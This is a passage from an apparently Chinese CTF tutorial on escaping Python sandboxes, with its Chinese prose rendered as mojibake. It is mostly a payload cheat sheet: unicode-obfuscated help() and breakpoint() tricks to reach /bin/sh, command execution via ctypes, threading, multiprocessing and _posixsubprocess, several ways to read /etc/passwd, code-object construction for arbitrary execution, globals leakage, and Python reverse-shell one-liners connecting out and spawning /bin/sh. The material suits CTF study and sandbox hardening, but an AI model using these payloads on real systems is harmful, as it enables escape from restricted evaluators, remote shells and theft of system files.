å½“æˆ‘ä»¬è¾“å…¥ help æ—¶ï¼Œæ³¨æ„è¦è¿›è¡Œ unicode ç¼–ç ï¼Œhelp å‡½æ•°ä¼šæ‰“å¼€å¸®åŠ©
```py
ğ˜©ğ˜¦ğ˜­ğ˜±()
```
ç„¶åè¾“å…¥ os,æ­¤æ—¶ä¼šè¿›å…¥ os çš„å¸®åŠ©æ–‡æ¡£ã€‚
```py
help> os
```
ç„¶ååœ¨è¾“å…¥ `!sh` å°±å¯ä»¥æ‹¿åˆ° /bin/sh, è¾“å…¥ `!bash` åˆ™å¯ä»¥æ‹¿åˆ° /bin/bash
```py
help> os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$ 
```

#### breakpoint å‡½æ•°
pdb æ¨¡å—å®šä¹‰äº†ä¸€ä¸ªäº¤äº’å¼æºä»£ç è°ƒè¯•å™¨ï¼Œç”¨äº Python ç¨‹åºã€‚å®ƒæ”¯æŒåœ¨æºç è¡Œé—´è®¾ç½®ï¼ˆæœ‰æ¡ä»¶çš„ï¼‰æ–­ç‚¹å’Œå•æ­¥æ‰§è¡Œï¼Œæ£€è§†å †æ ˆå¸§ï¼Œåˆ—å‡ºæºç åˆ—è¡¨ï¼Œä»¥åŠåœ¨ä»»ä½•å †æ ˆå¸§çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»»æ„ Python ä»£ç ã€‚å®ƒè¿˜æ”¯æŒäº‹åè°ƒè¯•ï¼Œå¯ä»¥åœ¨ç¨‹åºæ§åˆ¶ä¸‹è°ƒç”¨ã€‚

åœ¨è¾“å…¥ breakpoint() åå¯ä»¥ä»£å¼€ Pdb ä»£ç è°ƒè¯•å™¨ï¼Œåœ¨å…¶ä¸­å°±å¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç 
```py
>>> ğ˜£ğ˜³ğ˜¦ğ˜¢ğ˜¬ğ˜±ğ˜°ğ˜ªğ˜¯ğ˜µ()
--Return--
> <stdin>(1)<module>()->None
(Pdb) __import__('os').system('ls')
a-z0-9.py  exp2.py  exp.py  flag.txt
0
(Pdb) __import__('os').system('sh')
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
```
#### ctypes
```py
import ctypes

libc = ctypes.CDLL(None)
libc.system('ls ./'.encode())  # ä½¿ç”¨ encode() æ–¹æ³•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚å­—ç¬¦ä¸²
```

æ²™ç®±ä¸­å¯ä»¥è¿™ä¹ˆç”¨ï¼š
```py
__import__('ctypes').CDLL(None).system('ls /'.encode())
```

#### threading
åˆ©ç”¨æ–°çš„çº¿ç¨‹æ¥æ‰§è¡Œå‡½æ•°
```py
import threading
import os

def func():
    os.system('ls')  # åœ¨æ–°çš„çº¿ç¨‹ä¸­æ‰§è¡Œå‘½ä»¤

t = threading.Thread(target=func)  # åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹
t.start()  # å¼€å§‹æ‰§è¡Œæ–°çš„çº¿ç¨‹

```
å†™æˆä¸€è¡Œ:
```py
# eval, exec éƒ½å¯ä»¥æ‰§è¡Œçš„ç‰ˆæœ¬
__import__('threading').Thread(target=lambda: __import__('os').system('ls')).start() 

# exec å¯æ‰§è¡Œ
import threading, os; threading.Thread(target=lambda: os.system('ls')).start()
```

#### multiprocessing
```py
import multiprocessing
import os

def func():
    os.system('ls') 

p = multiprocessing.Process(target=func) 
p.start()
```

```py
__import__('multiprocessing').Process(target=lambda: __import__('os').system('ls')).start()
```

#### _posixsubprocess 
```py
import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

ç»“åˆ `__loader__.load_module(fullname)` å¯¼å…¥æ¨¡å—
```py
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module('os').pipe()), False, False,False, None, None, None, -1, None, False)
```

#### åå¼¹ shell
```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```

```py
s=__import__('socket').socket(__import__('socket').AF_INET,__import__('socket').SOCK_STREAM);s.connect(("127.0.0.1",12345));[__import__('os').dup2(s.fileno(),i) for i in range(3)];__import__('pty').spawn("/bin/sh")
```

#### æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ RCE
`CodeType` æ˜¯ python çš„å†…ç½®ç±»å‹ä¹‹ä¸€ï¼Œç”¨äºè¡¨ç¤ºç¼–è¯‘åçš„å­—èŠ‚ç å¯¹è±¡ã€‚`CodeType` å¯¹è±¡åŒ…å«äº†å‡½æ•°ã€æ–¹æ³•æˆ–æ¨¡å—çš„å­—èŠ‚ç æŒ‡ä»¤åºåˆ—ä»¥åŠä¸ä¹‹ç›¸å…³çš„å±æ€§ã€‚

python ä¸­å…³äº code class çš„æ–‡æ¡£é“¾æ¥:
- [types â€” Dynamic type creation and names for built-in types â€” Python 3.11.3 documentation](https://docs.python.org/3/library/types.html#types.CodeType)


`CodeType` å¯¹è±¡å…·æœ‰ä»¥ä¸‹å±æ€§ï¼š
- `co_argcount`: å‡½æ•°çš„å‚æ•°æ•°é‡ï¼Œä¸åŒ…æ‹¬å¯å˜å‚æ•°å’Œå…³é”®å­—å‚æ•°ã€‚
- `co_cellvars`: å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„é—­åŒ…å˜é‡çš„åç§°åˆ—è¡¨ã€‚
- `co_code`: å‡½æ•°çš„å­—èŠ‚ç æŒ‡ä»¤åºåˆ—ï¼Œä»¥äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºã€‚
- `co_consts`: å‡½æ•°ä¸­ä½¿ç”¨çš„å¸¸é‡çš„å…ƒç»„ï¼ŒåŒ…æ‹¬æ•´æ•°ã€æµ®ç‚¹æ•°ã€å­—ç¬¦ä¸²ç­‰ã€‚
- `co_exceptiontable`: å¼‚å¸¸å¤„ç†è¡¨ï¼Œç”¨äºæè¿°å‡½æ•°ä¸­çš„å¼‚å¸¸å¤„ç†ã€‚
- `co_filename`: å‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶åã€‚
- `co_firstlineno`: å‡½æ•°å®šä¹‰çš„ç¬¬ä¸€è¡Œæ‰€åœ¨çš„è¡Œå·ã€‚
- `co_flags`: å‡½æ•°çš„æ ‡å¿—ä½ï¼Œè¡¨ç¤ºå‡½æ•°çš„å±æ€§å’Œç‰¹å¾ï¼Œå¦‚æ˜¯å¦æœ‰é»˜è®¤å‚æ•°ã€æ˜¯å¦æ˜¯ç”Ÿæˆå™¨å‡½æ•°ç­‰ã€‚
- `co_freevars`: å‡½æ•°ä¸­ä½¿ç”¨çš„è‡ªç”±å˜é‡çš„åç§°åˆ—è¡¨ï¼Œè‡ªç”±å˜é‡æ˜¯åœ¨å‡½æ•°å¤–éƒ¨å®šä¹‰ä½†åœ¨å‡½æ•°å†…éƒ¨è¢«å¼•ç”¨çš„å˜é‡ã€‚
- `co_kwonlyargcount`: å‡½æ•°çš„å…³é”®å­—å‚æ•°æ•°é‡ã€‚
- `co_lines`: å‡½æ•°çš„æºä»£ç è¡Œåˆ—è¡¨ã€‚
- `co_linetable`: å‡½æ•°çš„è¡Œå·å’Œå­—èŠ‚ç æŒ‡ä»¤ç´¢å¼•ä¹‹é—´çš„æ˜ å°„è¡¨ã€‚
- `co_lnotab`: è¡¨ç¤ºè¡Œå·å’Œå­—èŠ‚ç æŒ‡ä»¤ç´¢å¼•ä¹‹é—´çš„æ˜ å°„å…³ç³»çš„å­—ç¬¦ä¸²ã€‚
- `co_name`: å‡½æ•°çš„åç§°ã€‚
- `co_names`: å‡½æ•°ä¸­ä½¿ç”¨çš„å…¨å±€å˜é‡çš„åç§°åˆ—è¡¨ã€‚
- `co_nlocals`: å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„æ•°é‡ã€‚
- `co_positions`: å‡½æ•°ä¸­ä¸ä½ç½®ç›¸å…³çš„å˜é‡ï¼ˆæ¯”å¦‚é—­åŒ…ä¸­çš„è‡ªç”±å˜é‡ï¼‰çš„åç§°åˆ—è¡¨ã€‚
- `co_posonlyargcount`: å‡½æ•°çš„ä»…ä½ç½®å‚æ•°æ•°é‡ã€‚
- `co_qualname`: å‡½æ•°çš„é™å®šåç§°ï¼ŒåŒ…å«äº†å‡½æ•°æ‰€åœ¨çš„æ¨¡å—å’Œç±»åã€‚
- `co_stacksize`: å‡½æ•°çš„å †æ ˆå¤§å°ï¼Œè¡¨ç¤ºå‡½æ•°æ‰§è¡Œæ—¶æ‰€éœ€çš„å †æ ˆç©ºé—´ã€‚
- `co_varnames`: å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„åç§°åˆ—è¡¨ã€‚

å‡è®¾å­˜åœ¨å¦‚ä¸‹çš„ä¸€ä¸ªå‡½æ•°. 
```py
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    def calc_flag(flag_rot2):
        return ''.join(chr(ord(c)-2) for c in flag_rot2)
    if some_input == var2:
        return calc_flag("VjkuKuVjgHnci")
    else:
        return "Nope"
```
æˆ‘ä»¬å¯ä»¥é€šè¿‡ `get_flag.__code__` è·å–å…¶ä»£ç å¯¹è±¡. ä»£ç å¯¹è±¡åŒ…å«äº†å…³äºä»£ç çš„æ‰€æœ‰ä¿¡æ¯, ä¾‹å¦‚ co_code å±æ€§å­˜å‚¨äº†å­—èŠ‚ç ä¿¡æ¯, å› æ­¤ä¿®æ”¹è¿™ä¸ªå­—èŠ‚ç å°±å¯ä»¥è¾¾åˆ°ä¿®æ”¹å‡½æ•°æ‰§è¡Œçš„ç›®çš„, ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpython å¯ä»¥å°†æŸä¸ªå‡½æ•°çš„ `__code__` å¯¹è±¡æ•´ä¸ªè¿›è¡Œä¿®æ”¹ã€‚ä»…ä»…ä¿®æ”¹å…¶ä¸­çš„å­å±æ€§æ˜¯ä¸è¡Œçš„ã€‚å¦‚ä¸‹æ‰€ç¤º, python ä¼šæŠ›å‡ºå¼‚å¸¸.
```py
>>> get_flag.__code__.co_code
b'\x97\x00d\x01}\x01d\x02}\x02d\x03d\x04g\x02}\x03d\x05\x84\x00}\x04|\x00|\x02k\x02\x00\x00\x00\x00r\x0b\x02\x00|\x04d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00d\x07S\x00'
>>> get_flag.__code__.co_code = 1
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: attribute 'co_code' of 'code' objects is not writable
```

è¿™ç§æƒ…å†µä¸‹,æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªæ–°çš„ä»£ç å¯¹è±¡å¹¶ä¸»åŠ¨æ‰§è¡Œ.å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š

1. ç¬¬ä¸€æ­¥ï¼Œæœ¬åœ°æ„é€  payload
    ```py
    def read():
        return print(open("/etc/passwd",'r').read())
    ```
2. è·å–åˆ›å»ºä»£ç å¯¹è±¡æ‰€éœ€çš„å‚æ•°, é€šè¿‡ help æˆ–è€… `__doc__` å±æ€§è¿›è¡Œè·å–, ä¸åŒçš„ç‰ˆæœ¬æœ‰æ‰€å·®å¼‚ï¼Œ æˆ‘åœ¨æœ¬åœ°æµ‹è¯•æ—¶ç‰ˆæœ¬ä¸º python 3.11.2ï¼Œæ­¤æ—¶ code éœ€è¦ä¼ å…¥ 17 ä¸ªå‚æ•°ï¼Œä¸”ä¸æ”¯æŒå…³é”®å­—ä¼ é€’ã€‚
   ```py
    >>>> import types
    >>> help(types.CodeType)
    code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars=(), cellvars=(), /)
   ```
   
3. å‚æ•°èµ‹å€¼ã€‚è·å–åˆ°æ‰€éœ€çš„å‚æ•°ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™äº›å‚æ•°å…ˆä¿å­˜åœ¨å˜é‡ä¸­ã€‚
   ```py
    code = read.__code__

    argcount = code.co_argcount
    posonlyargcount = code.co_posonlyargcount
    kwonlyargcount = code.co_kwonlyargcount
    nlocals = code.co_nlocals
    stacksize = code.co_stacksize
    flags = code.co_flags
    codestring = code.co_code
    constants = code.co_consts
    names = code.co_names
    varnames = code.co_varnames
    filename = code.co_filename
    name = code.co_name
    qualname = code.co_qualname
    firstlineno = code.co_firstlineno
    linetable = code.co_linetable
    exceptiontable = code.co_exceptiontable
    freevars = code.co_freevars
    cellvars = code.co_cellvars
   ```
4. åˆ›å»ºä»£ç å¯¹è±¡ã€‚åˆ›å»ºä»£ç å¯¹è±¡éœ€è¦è°ƒç”¨ types.CodeTypeã€‚
   ```py
   import types
   codeobj = types.CodeType(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars, cellvars)
   ```
   ä¹Ÿå¯ä»¥ä½¿ç”¨ builtins ä¸­çš„ type å‡½æ•°è·å–åˆ°è¿™ä¸ªç±»
   ```py
   code_type = type((lambda: None).__code__)
   ```
5. è°ƒç”¨å‡½æ•°ã€‚ä»ä»£ç å¯¹è±¡è¿›è¡Œè°ƒç”¨éœ€è¦åˆ›å»ºä¸€ä¸ªå‡½æ•°å¯¹è±¡, è·å–è¿™ä¸ªç±»å¯ä»¥ä½¿ç”¨ type å‡½æ•°ï¼Œæˆ–è€…ç›´æ¥ import
   ```py
   function_type = type(lambda: None)
   ```
   åˆ›å»ºå‡½æ•°å¯¹è±¡æ‰€éœ€çš„å‚æ•°å¦‚ä¸‹ï¼Œå¯ä»¥é€šè¿‡ help å‡½æ•°æŸ¥çœ‹
   ```py
   function(code, globals, name=None, argdefs=None, closure=None)
   ```
   ä¸€èˆ¬æƒ…å†µä¸‹åªéœ€è¦å‰ä¸¤ä¸ªå‚æ•°å³å¯ï¼š
   ```py
   mydict = {}
   mydict['__builtins__'] = __builtins__
   function_type(codeobj, mydict, None, None, None)()
   ```

6. è°ƒç”¨å‡½æ•°ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ eval æˆ–è€… exec
   ```py
   eval(codeobj)
   ```

å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š
```py
def read():
        return print(open("/etc/passwd",'r').read())

function_type = type(lambda: None)
code_type = type((lambda: None).__code__)

code = read.__code__

argcount = code.co_argcount
posonlyargcount = code.co_posonlyargcount
kwonlyargcount = code.co_kwonlyargcount
nlocals = code.co_nlocals
stacksize = code.co_stacksize
flags = code.co_flags
codestring = code.co_code
constants = code.co_consts
names = code.co_names
varnames = code.co_varnames
filename = code.co_filename
name = code.co_name
qualname = code.co_qualname
firstlineno = code.co_firstlineno
linetable = code.co_linetable
exceptiontable = code.co_exceptiontable
freevars = code.co_freevars
cellvars = code.co_cellvars


mydict = {}
mydict['__builtins__'] = __builtins__

codeobj = code_type(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars, cellvars)
# code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars=(), cellvars=(),/)

# function_type(codeobj, mydict, None, None, None)()
eval(codeobj)
```

æœ€ç»ˆå¯ä»¥æˆåŠŸè¯»å– /etc/passwd

#### è¿­ä»£å™¨

### è¯»å†™æ–‡ä»¶

#### file ç±»
```py
# Python2 
file('test.txt').read()
#æ³¨æ„ï¼šè¯¥å‡½æ•°åªå­˜åœ¨äºPython2ï¼ŒPython3ä¸å­˜åœ¨
```
#### open å‡½æ•°
```py
open('/etc/passwd').read()
__builtins__.open('/etc/passwd').read()
__import__("builtins").open('/etc/passwd').read()
```
#### codecs æ¨¡å—
```py
import codecs
codecs.open('test.txt').read()
```
#### get_data å‡½æ•°
FileLoader ç±» 
```py
# _frozen_importlib_external.FileLoader.get_data(0,<filename>)
"".__class__.__bases__[0].__subclasses__()[91].get_data(0,"app.py")
```
ç›¸æ¯”äºè·å– `__builtins__` å†ä½¿ç”¨ open å»è¿›è¡Œè¯»å–,ä½¿ç”¨ get_data çš„ payload æ›´çŸ­.

#### linecache æ¨¡å—
getlines å‡½æ•°
```py
>>> import linecache
>>> linecache.getlines('/etc/passwd')
>>> __import__("linecache").getlines('/etc/passwd')
```

getline å‡½æ•°éœ€è¦ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¡Œå·
```py
__import__("linecache").getline('/etc/passwd',1)
```

#### license å‡½æ•°
```py
__builtins__.__dict__["license"]._Printer__filenames=["/etc/passwd"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```

### è·å–å‡½æ•°ä¿¡æ¯

python ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª `__code__` å±æ€§.è¿™ä¸ª`__code__` å±æ€§å°±æ˜¯ä¸Šé¢çš„ä»£ç å¯¹è±¡ï¼Œå­˜æ”¾äº†å¤§é‡æœ‰å…³äºè¯¥å‡½æ•°çš„ä¿¡æ¯.

å‡è®¾ä¸Šä¸‹æ–‡å­˜åœ¨ä¸€ä¸ªå‡½æ•°
```py
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    if some_input == var2:
        return "THIS-IS-THE-FALG!"
    else:
        return "Nope"
```
`__code__` å±æ€§åŒ…å«äº†è¯¸å¤šå­å±æ€§,è¿™äº›å­å±æ€§ç”¨äºæè¿°å‡½æ•°çš„å­—èŠ‚ç å¯¹è±¡,ä¸‹é¢æ˜¯å¯¹è¿™äº›å±æ€§çš„è§£é‡Šï¼š
- `co_argcount`: å‡½æ•°çš„å‚æ•°æ•°é‡ï¼Œä¸åŒ…æ‹¬å¯å˜å‚æ•°å’Œå…³é”®å­—å‚æ•°ã€‚
- `co_cellvars`: å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„é—­åŒ…å˜é‡çš„åç§°åˆ—è¡¨ã€‚
- `co_code`: å‡½æ•°çš„å­—èŠ‚ç æŒ‡ä»¤åºåˆ—ï¼Œä»¥äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºã€‚
- `co_consts`: å‡½æ•°ä¸­ä½¿ç”¨çš„å¸¸é‡çš„å…ƒç»„ï¼ŒåŒ…æ‹¬æ•´æ•°ã€æµ®ç‚¹æ•°ã€å­—ç¬¦ä¸²ç­‰ã€‚
- `co_exceptiontable`: å¼‚å¸¸å¤„ç†è¡¨ï¼Œç”¨äºæè¿°å‡½æ•°ä¸­çš„å¼‚å¸¸å¤„ç†ã€‚
- `co_filename`: å‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶åã€‚
- `co_firstlineno`: å‡½æ•°å®šä¹‰çš„ç¬¬ä¸€è¡Œæ‰€åœ¨çš„è¡Œå·ã€‚
- `co_flags`: å‡½æ•°çš„æ ‡å¿—ä½ï¼Œè¡¨ç¤ºå‡½æ•°çš„å±æ€§å’Œç‰¹å¾ï¼Œå¦‚æ˜¯å¦æœ‰é»˜è®¤å‚æ•°ã€æ˜¯å¦æ˜¯ç”Ÿæˆå™¨å‡½æ•°ç­‰ã€‚
- `co_freevars`: å‡½æ•°ä¸­ä½¿ç”¨çš„è‡ªç”±å˜é‡çš„åç§°åˆ—è¡¨ï¼Œè‡ªç”±å˜é‡æ˜¯åœ¨å‡½æ•°å¤–éƒ¨å®šä¹‰ä½†åœ¨å‡½æ•°å†…éƒ¨è¢«å¼•ç”¨çš„å˜é‡ã€‚
- `co_kwonlyargcount`: å‡½æ•°çš„å…³é”®å­—å‚æ•°æ•°é‡ã€‚
- `co_lines`: å‡½æ•°çš„æºä»£ç è¡Œåˆ—è¡¨ã€‚
- `co_linetable`: å‡½æ•°çš„è¡Œå·å’Œå­—èŠ‚ç æŒ‡ä»¤ç´¢å¼•ä¹‹é—´çš„æ˜ å°„è¡¨ã€‚
- `co_lnotab`: è¡¨ç¤ºè¡Œå·å’Œå­—èŠ‚ç æŒ‡ä»¤ç´¢å¼•ä¹‹é—´çš„æ˜ å°„å…³ç³»çš„å­—ç¬¦ä¸²ã€‚
- `co_name`: å‡½æ•°çš„åç§°ã€‚
- `co_names`: å‡½æ•°ä¸­ä½¿ç”¨çš„å…¨å±€å˜é‡çš„åç§°åˆ—è¡¨ã€‚
- `co_nlocals`: å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„æ•°é‡ã€‚
- `co_positions`: å‡½æ•°ä¸­ä¸ä½ç½®ç›¸å…³çš„å˜é‡ï¼ˆæ¯”å¦‚é—­åŒ…ä¸­çš„è‡ªç”±å˜é‡ï¼‰çš„åç§°åˆ—è¡¨ã€‚
- `co_posonlyargcount`: å‡½æ•°çš„ä»…ä½ç½®å‚æ•°æ•°é‡ã€‚
- `co_qualname`: å‡½æ•°çš„é™å®šåç§°ï¼ŒåŒ…å«äº†å‡½æ•°æ‰€åœ¨çš„æ¨¡å—å’Œç±»åã€‚
- `co_stacksize`: å‡½æ•°çš„å †æ ˆå¤§å°ï¼Œè¡¨ç¤ºå‡½æ•°æ‰§è¡Œæ—¶æ‰€éœ€çš„å †æ ˆç©ºé—´ã€‚
- `co_varnames`: å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„åç§°åˆ—è¡¨ã€‚


ä¸‹é¢æ˜¯ä¸€äº›ä½¿ç”¨ç¤ºä¾‹:

#### è·å–æºä»£ç ä¸­çš„å¸¸é‡

å¯ä»¥ä½¿ç”¨ `__code__.co_consts` è¿™ç§æ–¹æ³•è¿›è¡Œè·å–, co_consts å¯ä»¥è·å–å¸¸é‡.
```py
>>> get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')
```

#### è·å–å˜é‡

åˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ payload è·å– get_flag å‡½æ•°ä¸­çš„å˜é‡ä¿¡æ¯
```py
__globals__

get_flag.__globals__

>>> get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')
```

#### è·å–å‡½æ•°å­—èŠ‚ç åºåˆ—
get_flag å‡½æ•°çš„ `.__code__.co_code`, å¯ä»¥è·å–åˆ°å‡½æ•°çš„å­—èŠ‚ç åºåˆ—:
```py
>>> get_flag.__code__.co_code
b'\x97\x00d\x01}\x01d\x02}\x02d\x03d\x04g\x02}\x03|\x00|\x02k\x02\x00\x00\x00\x00r\x02d\x05S\x00d\x06S\x00'
```

å­—èŠ‚ç å¹¶ä¸åŒ…å«æºä»£ç çš„å®Œæ•´ä¿¡æ¯ï¼Œå¦‚å˜é‡åã€æ³¨é‡Šç­‰ã€‚ä½†å¯ä»¥ä½¿ç”¨ dis æ¨¡å—æ¥åæ±‡ç¼–å­—èŠ‚ç å¹¶è·å–å¤§è‡´çš„æºä»£ç .
```py
>>> bytecode = get_flag.__code__.co_code
>>> dis.dis(bytecode)
          0 RESUME                   0
          2 LOAD_CONST               1
          4 STORE_FAST               1
          6 LOAD_CONST               2
          8 STORE_FAST               2
         10 LOAD_CONST               3
         12 LOAD_CONST               4
         14 BUILD_LIST               2
         16 STORE_FAST               3
         18 LOAD_FAST                0
         20 LOAD_FAST                2
         22 COMPARE_OP               2 (==)
         28 POP_JUMP_FORWARD_IF_FALSE     2 (to 34)
         30 LOAD_CONST               5
         32 RETURN_VALUE
    >>   34 LOAD_CONST               6
         36 RETURN_VALUE
```
è™½ç„¶èƒ½è·å–ä½†ä¸å¤ªæ–¹ä¾¿çœ‹,å¦‚æœèƒ½å¤Ÿè·å– `__code__` å¯¹è±¡,ä¹Ÿå¯ä»¥é€šè¿‡ dis.disassemble è·å–æ›´æ¸…æ™°çš„è¡¨ç¤º.
```py
>>> bytecode = get_flag.__code__
>>> dis.disassemble(bytecode)
  1           0 RESUME                   0

  2           2 LOAD_CONST               1 (1)
              4 STORE_FAST               1 (var1)

  3           6 LOAD_CONST               2 ('secretcode')
              8 STORE_FAST               2 (var2)

  4          10 LOAD_CONST               3 ('some')
             12 LOAD_CONST               4 ('array')
             14 BUILD_LIST               2
             16 STORE_FAST               3 (var3)

  5          18 LOAD_FAST                0 (some_input)
             20 LOAD_FAST                2 (var2)
             22 COMPARE_OP               2 (==)
             28 POP_JUMP_FORWARD_IF_FALSE     2 (to 34)

  6          30 LOAD_CONST               5 ('THIS-IS-THE-FALG!')
             32 RETURN_VALUE

  8     >>   34 LOAD_CONST               6 ('Nope')
             36 RETURN_VALUE
```


### è·å–ç¯å¢ƒä¿¡æ¯


#### è·å– python ç‰ˆæœ¬
sys æ¨¡å—
```py
import sys
sys.version
```

platform æ¨¡å—
```py
import platform
platform.python_version()
```
#### è·å– linux ç‰ˆæœ¬
platform æ¨¡å—
```py
import platform
platform.uname()
```
#### è·å–è·¯å¾„
```py
sys.path
sys.modules
```


### è·å–å…¨å±€å˜é‡
#### globals å‡½æ•°
globals å‡½æ•°å¯ä»¥è·å–æ‰€æœ‰çš„å…¨å±€å˜é‡ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹é¢˜ï¼Œé¢˜ç›®çš„ç›®æ ‡å°±æ˜¯è·å– fake_key_var_in_the_local_but_real_in_the_remote çš„å€¼è¿›å…¥ backdoor å‡½æ•°ã€‚è¿™é‡Œä½¿ç”¨ globals å°±å¯ä»¥è·å– fake_key_var_in_the_local_but_real_in_the_remote çš„å€¼ã€‚
```py
#it seems have a backdoor
#can u find the key of it and use the backdoor

fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"

def func():
    code = input(">")
    if(len(code)>9):
        return print("you're hacker!")
    try:
        print(eval(code))
    except:
        pass

def backdoor():
    print("Please enter the admin key")
    key = input(">")
    if(key == fake_key_var_in_the_local_but_real_in_the_remote):
        code = input(">")
        try:
            print(eval(code))
        except:
            pass
    else:
        print("Nooo!!!!")

WELCOME = '''
  _       _          _       _          _       _        
 | |     | |        | |     | |        | |     | |       
 | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
 | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \
 | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     
'''

print(WELCOME)

print("Now the program has two functions")
print("can you use dockerdoor")
print("1.func")
print("2.backdoor")
input_data = input("> ")
if(input_data == "1"):
    func()
    exit(0)
elif(input_data == "2"):
    backdoor()
    exit(0)
else:
    print("not found the choice")
    exit(0)
```

#### help å‡½æ•°
help å‡½æ•°ä¹Ÿå¯ä»¥è·å–æŸä¸ªæ¨¡å—çš„å¸®åŠ©ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡, è¾“å…¥ `__main__` ä¹‹åå¯ä»¥è·å–å½“å‰æ¨¡å—çš„ä¿¡æ¯ã€‚
```py
help> __main__
```
ç›¸æ¯” globals() è€Œè¨€ help() æ›´çŸ­ï¼Œåœ¨ä¸€äº›é™åˆ¶é•¿åº¦çš„é¢˜ç›®ä¸­æœ‰åˆ©ç”¨è¿‡è¿™ä¸ªç‚¹ã€‚



## å‚è€ƒèµ„æ–™
- [Pythonæ²™ç®±é€ƒé€¸](https://www.cnblogs.com/h0cksr/p/16189741.html)
- [Pythonæ²™ç®±é€ƒé€¸å°ç»“](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] pythonæ²™ç®±é€ƒé€¸æ¢ç©¶Â·ä¸Šï¼ˆHNCTFé¢˜è§£ - WEEK1ï¼‰](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] pythonæ²™ç®±é€ƒé€¸æ¢ç©¶Â·ä¸­ï¼ˆHNCTFé¢˜è§£ - WEEK2ï¼‰](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] pythonæ²™ç®±é€ƒé€¸æ¢ç©¶Â·ä¸‹ï¼ˆHNCTFé¢˜è§£ - WEEK3ï¼‰](https://zhuanlan.zhihu.com/p/579183067)
- [audited2](https://ctftime.org/writeup/31883)
- [[GCTF 2022] Treebox | /dev/ur4ndom - Robin Jadoul](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)